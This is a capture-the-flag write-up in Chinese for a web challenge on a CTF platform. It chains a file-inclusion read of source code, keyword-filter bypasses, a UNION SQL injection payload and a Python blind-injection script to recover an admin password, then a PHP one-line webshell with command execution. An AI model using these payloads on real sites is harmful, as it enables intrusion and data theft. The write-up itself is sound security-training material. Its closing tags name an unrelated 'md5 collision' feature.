---
typora-root-url: ..\..\_images
---

# 综合2

## 题目

> http://ctf.nuptzj.cn/challenges#%E7%BB%BC%E5%90%88%E9%A2%982
>
> ```
> Xlcteam客户留言板
>  
>   欢迎来到Xlcteam客户留言板，各位朋友可以在这里留下对本公司的意见或建议。
> 
>   本组织主要为企业提供网络安全服务。正如公司名所说，本公司是混迹在“娱乐圈”中的公司，喜欢装B，一直摸黑竞争对手，从未被黑。
>   本公司的经营理念为“技术好，算个吊，摸黑对手有一套，坑到学生才叫吊~”。
>   你别说不爽我们，有本事来爆我们（科哥）菊花~ come on！！
>  
> 客户留言：
> 
> 大秘密:
>     交个朋友吧，这个是我微信号 e045e454c18ca8a4415cfeddd1f7375eb0595c71ac00a0e4758761e1cc83f2c565bb09bfd94d1f6c2ffc0fb9849203a14af723b532cbf44a2d6f41b0dee4e834 这是原来管理员说的话，一不小心给覆盖了，sorry！！！欢迎来到xlcteam渗透挑战平台，在这里各位黑阔可以尽情施展你们那牛X的技术和猥琐流的渗透技巧。 （别说SAE没有写权限传不了shell，渗透到后台之后就什么都知道了）。 对了，各位脚本小子就不要拿各种扫描工具猛扫了，也扫不到什么东西的。当然，适当的收集资料还是可以的
> t0n9:
>     t0n9
> ggggg:
>     hi
> Beta.meee:
>     Hacked by meee
> sido:
>     123
> Holden:
>     山东红蓝队
> 小圆圆，小圆圆！:
>     hacked by 小圆圆
> ```
>
> 



## 解答思路

- 遍历所有页面，查看所有隐藏信息
- 使用LFI查看所有页面的源代码


## 解题步骤

#### 0x1 查看页面底部的链接

> #### [本CMS说明](http://cms.nuptzj.cn/about.php?file=sm.txt)

内容如下：

> 很明显，这是安装后留下来忘删除的文件。。。 至于链接会出现在主页上，这就要问管理员了。。。 ===============================华丽的分割线============================= 本CMS由Funny公司开发的公司留言板系统，据本技术总监说，此CMS采用国际 顶级的技术所开发，安全性和实用性杠杠滴~</br> 以下是本CMS各文件的功能说明（由于程序猿偷懒，只列了部分文件） config.php：存放数据库信息，移植此CMS时要修改 index.php：主页文件 passencode.php：Funny公司自写密码加密算法库 say.php：用于接收和处理用户留言请求 sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索，我在这里给出admin表结构 create table admin ( id integer, username text, userpass text, ) ======================================================================== 下面是正经的： 本渗透测试平台由：三只小潴(root#zcnhonker.net)& 冷爱(hh250@qq.com)开 发.由你们周老大我辛苦修改，不能题目都被AK嘛，你们说是不是。所以这一题。。你们做出来也算你们吊咯。 

可以得知：

1. 页面包含的文件如下：

   - config.php
   - passencode.php 
   - index.php
   - say.php
   - sm.txt

2. admin的表结构如下：

   ```mssql
   create table admin ( id integer, username text, userpass text, ) 
   ```

#### 0x2 依次访问各文件 

通过文件包含的方式（类似http://cms.nuptzj.cn/about.php?file=sm.txt），依次访问各个文件

- config.php 

  无任何返回值

- passencode.php 

  ```php+HTML
  <?php function passencode($content){
      $pass=urlencode($content);
      $array=str_split($content);
      $pass=""; 
      for($i=0;$i<count($array);$i++){
          if($pass!=""){
              $pass=$pass." ".(string)ord($array[$i]);}
          else{ 
              $pass=(string)ord($array[$i]);
          } 
      } return $pass;
  }
  ?>
  ```

  这里可以看出密码在数据库的存储方式：将每个字符转化为其ascii码值，以空格为分隔符进行拼接

- say.php 

  ```php+html
  <html>
      <head>
          <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
          <meta http-equiv="Content-Type" content="text/html; charset=utf-8"><?php
          include 'config.php';
          $nice=$_POST['nice'];
          $say=$_POST['usersay'];
          if(!isset($_COOKIE['username'])){
          setcookie('username',$nice);
          setcookie('userpass','');
          }
          $username=$_COOKIE['username'];
          $userpass=$_COOKIE['userpass'];
          if($nice==""|| $say==""){
          echo "<script >alert('昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)');</script >";
          exit();
          }
          $con = mysql_connect($db_address,$db_user,$db_pass) or die("不能连接到数据库！！".mysql_error());
          mysql_select_db($db_name,$con);
          $nice=mysql_real_escape_string($nice);
          
          $username=mysql_real_escape_string($username);
          $userpass=mysql_real_escape_string($userpass);
          $result=mysql_query("SELECT username FROM admin where username='$nice'",$con);
          $login=mysql_query("SELECT * FROM admin where username='$username' AND userpass='$userpass'",$con);
          if(mysql_num_rows($result)>0 &&mysql_num_rows($login)<=0){
          echo "<script >alert('昵称已被使用，请更换！');</script >";
          mysql_free_result($login);
          mysql_free_result($result);
          mysql_close($con);
          exit();
          }
          mysql_free_result($login);
          mysql_free_result($result);
          $say=mysql_real_escape_string($say);
          mysql_query("insert into message (nice,say,display) values('$nice','$say',0)",$con);
          mysql_close($con);
          echo '<script >alert("构建和谐社会，留言需要经过管理员审核才可以显示！");window.location = "./index.php "</script >';
          ?>
          <title></title>
      </head>
      <body>
      </body>
  </html>
  ```

  > mysql_real_escape_string() 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: \x00, \n, \r, \, ', " 和 \x1a.

- 除了sm.txt中提到的文件，还不要忘记**about.php**页面

  about.php

  ```php+html
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
  <?php
  $file = $_GET['file'];
  if ($file == "" || strstr($file, 'config.php')) {
      echo "file参数不能为空！";
      exit();
  } else {
      $cut = strchr($file, "loginxlcteam");
      if ($cut == false) {
          $data = file_get_contents($file);
          $date = htmlspecialchars($data);
          echo $date;
      } else {
          echo "<script>alert('敏感目录，禁止查看！但是。。。')</script>";
      }
  }
  ?>
  ```
  这里注意到`loginxlcteam`，直接访问`/loginxlcteam`的页面，该页面为后台管理登录页面

- 在搜索时，会提交到so.php

  so.php

  ```php+html
  <html>
      <head>
          <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
          <title>
              搜索留言
          </title>
      </head>
      <body>
          <center>
              <div id="say" name="say" align="left" style="width:1024px">
                  <?php
                  if ($_SERVER['HTTP_USER_AGENT'] != "Xlcteam Browser") {
                      echo '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~';
                      exit();
                  }
                  $id = $_POST['soid'];
                  include 'config.php';
                  include 'antiinject.php';
                  include 'antixss.php';
                  $id = antiinject($id);
                  $con = mysql_connect($db_address, $db_user, $db_pass) or die("不能连接到数据库！！" . mysql_error());
                  mysql_select_db($db_name, $con);
                  $id = mysql_real_escape_string($id);
                  $result = mysql_query("SELECT * FROM `message` WHERE display=1 AND id=$id");
                  $rs = mysql_fetch_array($result);
                  echo htmlspecialchars($rs['nice']) . ':<br />&nbsp;&nbsp;&nbsp;&nbsp;' . antixss($rs['say']) . '<br />';
                  mysql_free_result($result);
                  mysql_free_result($file);
                  mysql_close($con); ?>
              </div>
          </center>
      </body>
  </html>
  ```

  1. 这里又发现了新的php页面antiinject.php
  2. 修改useragent为`Xlcteam Browser`来访问so.php页面
  3. 这里存在可能的sql注入漏洞，继续查看antiinject.php

- antiinject.php

   ```php+html
   <?php
   function antiinject($content) {
    $keyword = array(
        "select",
        "union",
        "and",
        "from",
        ' ',
        "'",
        ";",
        '"',
        "char",
        "or",
        "count",
        "master",
        "name",
        "pass",
        "admin",
        "+",
        "-",
        "order",
        "="
    );
    $info = strtolower($content);
    for ($i = 0; $i <= count($keyword); $i++) {
        $info = str_replace($keyword[$i], '', $info);
    }
    return $info;
   } ?>
   ```
   - 这里发现：

   > 本网站对部分关键字与空格进行了过滤，因此对于关键词使用双重绕过，空格用/**/代替 

   - sql注入语句

     1. 在post中提交数据：（这里省略了猜测字段列数的过程）

        ```mssql
        soid=0/**/unUNIONion/**/seSELECTlect/**/1,userpasPASSs,3,4/**/fFROMrom/**/adADMINmin
        ```

        得到返回：

        > 102 117 99 107 114 117 110 116 117

     2. 使用盲注的方法

        编写python脚本

        ```python
        # -*- coding: UTF-8 -*-
        import requests
        
        
        def get_db():
            url = "http://cms.nuptzj.cn/so.php"
            header = {
                'User-Agent': 'Xlcteam Browser',
                'Host': 'cms.nuptzj.cn',
            }
            payload1 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
            result = ""
            for j in range(1, 35):
                for i in payload1:
                    char = str(ord(i))
                    num = str(j)
                    payload = '1/**/aANDnd/**/exists(seSELECTlect/**/*/**/fFROMrom/**/admADMINin/**/where/**/oORrd(substring(userpPASSass/**/frFROMom/**/{0}/**/foORr/**/1))>{1})'.format(num,char)
                    # payload = '1/*x*/anANDd/*x*/exists(seleSELECTct/*x*/*/*x*/frFROMom/*x*/admiADMINn/*x*/WHERE/*x*/oORrd(substring(userpaspasss/*x*/froFROMm/*x*/{0}/*a*/FOorR/*a*/1))>{1})'.format(num, char)
                    data = {
                            "soid":payload
                    }
                    response = requests.post(url=url,headers=header,data=data)
                    text = response.text
                    print text
                    # text = str(text)
                    result_len = len(text)
                    if(result_len < 430):
                        result += chr(int(char))
                        break
            print(result)
        
        get_db()
        ```

        得到结果：

        > 1020117099010701140117011001160117

     3. 使用sqlmap+tamper

        - [ ] 待实现
        - **nonrecursivereplacement.py**  双重查询语句绕过

        ```mysql
        keywords = ("UNION", "SELECT", "INSERT", "UPDATE", "FROM", "WHERE")
        ```

        在该tamper中只实现了以上几个关键词的双重过滤，而实际情况需要根据过滤的名单来确定，所以其灵活性不够，不知道是否有可以自定义过滤名单的tamper，或者需要自己实现一个该类型的tamper

        - **space2comment.py** 用/**/代替空格  

          ```shell
          sqlmap -u “http://1.1.1.1/a.php?id=1” --tamper="between.py, randomcase.py,space2comment.py" -v 3
          dpkg -L sqlmap | grep tamper (找要引用的脚本)  
          -v 3是为了显示更加详细的内容
          ```

          

   - 观察得到的结果，联系passencode.php，可以解出password为：fuckruntu 

#### 0x3 登录后台

- 使用得到的用户名密码登录后台，看到页面

> 恭喜你已拿下后台，离爆菊只差一步了flag1:nctf{}
>
>
> 能来到这里，相信也不是只会用工具的脚本小子了
> 现在离爆菊只差一步了
> 因为程序猿连后台都懒得开发了，为了方便管理，他邪恶地放了一个一句话木马在网站的根目录下
> 小马的文件名为：xlcteam.php
> 黑阔，哎哟~不错哦

- 查看xlcteam.php

```php+html
<?php

$e = $_REQUEST['www'];
$arr = array(
    $_POST['wtf'] => '|.*|e',
);
array_walk($arr, $e, ''); ?>

```

- 该页面为php回调函数一句话，使用菜刀连接

`http://cms.nuptzj.cn/loginxlcteam/xlcteam.php?www=str_replace  密码：wtf`

​	或者提交以下命令：

```php
wtf='print_r(scandir())'   
```

​	

- 遍历文件，看到flag相关的txt文件，打开即得到答案

## 漏洞挖掘思路

- todo

## 自动化解析

- TODO

- 判断题目特征：`web` `php` `md5 collision`
- 设定题目难度等级`level`为simple
- 提交相应符合要求的字符串
